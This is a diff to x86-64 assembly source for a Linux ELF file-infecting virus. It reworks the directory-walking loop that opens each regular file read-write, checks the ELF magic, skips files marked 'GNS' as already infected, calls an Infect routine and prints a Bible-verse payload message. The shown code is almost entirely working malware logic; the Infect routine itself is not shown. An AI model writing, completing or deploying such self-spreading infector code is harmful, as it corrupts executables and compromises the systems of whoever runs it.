@@ -33,83 +33,87 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   push  rax                                         ; save fd
   push  0x00                                        ; bytes read
   sub   rsp,  SZ_DENT
+
+  .EnumDir:
+    GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT    ; GetDents64(fd, buf, buflen)
+    cmp   rax,  0x00
+    jle   .EnumDirDone
+
+    xor   r9,   r9                                  ; Counter   = 0
+    mov   [rsp + SZ_DENT],  rax                     ; EndCount  = rax
   
-  GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT      ; GetDents64(fd, buf, buflen)
-  test  rax,  rax
-  jl    .EnumDirDone
+    .EnumFiles:
+      cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
+      jne   .NextIteration
 
-  xor   r9,   r9                                    ; Counter   = 0
-  mov   [rsp + SZ_DENT],  rax                       ; EndCount  = rax
+      ;; GET FILE >---------------------------------------------------------<
+    
+      lea   r13, [rsp + r9 + linux_dirent64.d_name]
+
+      Open  r13,  O_RDWR, 0x00
+      test  rax,  rax
+      js   .NextIteration
   
-  .EnumFiles:
-    cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
-    jne   .NextIteration
-
-    ;; GET FILE >-----------------------------------------------------------<
+      mov   rbx,  rax   ; save fd
     
-    lea   r13, [rsp + r9 + linux_dirent64.d_name]
+      lea   r14,  [rsp + SZ_DENT + 16]
+      Read  rbx,  r14, 0x10
+      cmp   rax,  0x10
+      jne   .NextFile
 
-    Open  r13,  O_RDWR, 0x00
-    test  rax,  rax
-    js   .NextIteration
-  
-    mov   rbx,  rax   ; save fd
+      ;; CHECK IF ELF >-----------------------------------------------------<
     
-    lea   r14,  [rsp + SZ_DENT + 16]
-    Read  rbx,  r14, 0x10
-    cmp   rax,  0x10
-    jne   .NextFile
+      cmp   dword [r14], ELF_MAGIC
+      jne   .NextFile
 
-    ;; CHECK IF ELF >-------------------------------------------------------<
+      ;; CHECK ALREADY INFECTED >-------------------------------------------<
+
+      mov   eax, dword [r14 + 0xC]
+      cmp   eax, 0x534e4700                           ; Check for "GNS" in Padding
+      je    .NextFile                                 ; Already Infected
     
-    cmp   dword [r14], ELF_MAGIC
-    jne   .NextFile
+      ;; INFECT FILE >------------------------------------------------------<
 
-    ;; CHECK ALREADY INFECTED >---------------------------------------------<
+      push  rbx
+      call  Infect
+      pop   rbx
 
-    mov   eax, dword [r14 + 0xC]
-    cmp   eax, 0x534e4700                           ; Check for "GNS" in Padding
-    je    .NextFile                                 ; Already Infected
+      ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<
+
+      jmp .Payload
     
-    ;; INFECT FILE >--------------------------------------------------------<
+      .msg:    ; idk why I made it a byte array...
+    	  db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
+	      db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
+	      db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
+	      db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
+	      db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
+	      db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
+	      db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
+	      db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
+	      db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
+	      db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
+        db  0x00
+        msglen equ $-.msg
 
-    push  rbx
-    call  Infect
-    pop   rbx
+      .Payload:
+      Write STDOUT, .msg, msglen
 
-    ;; EXEC PAYLOAD (PRINT STDOUT) >----------------------------------------<
+      Close rbx
 
-    jmp .Payload
-    
-    .msg:    ; idk why I made it a byte array...
-    	db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
-	    db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
-	    db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
-	    db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
-	    db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
-	    db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
-	    db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
-	    db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
-	    db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
-	    db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
-      db  0x00
-      msglen equ $-.msg
+      jmp   .EnumDirDone
 
-    .Payload:
-    Write STDOUT, .msg, msglen
+    .NextFile:
+      Close rbx
 
-    jmp   .EnumDirDone
+    .NextIteration:
+      add   r9w, word [rsp + linux_dirent64.d_reclen]  ; len
+      cmp   r9w, word [rsp + SZ_DENT]                  ; bytes_read
+      jl    .EnumFiles
 
-  .NextFile:
-    Close rbx
-
-  .NextIteration:
-    add   r9w, word [rsp + linux_dirent64.d_reclen]  ; len
-    cmp   r9w, word [rsp + SZ_DENT]                  ; bytes_read
-    jle   .EnumFiles
+    jmp   .EnumDir
 
 .EnumDirDone:
-  Close   rbx
   add     rsp,  SZ_DENT
   pop     rdi
   Close   [rsp]
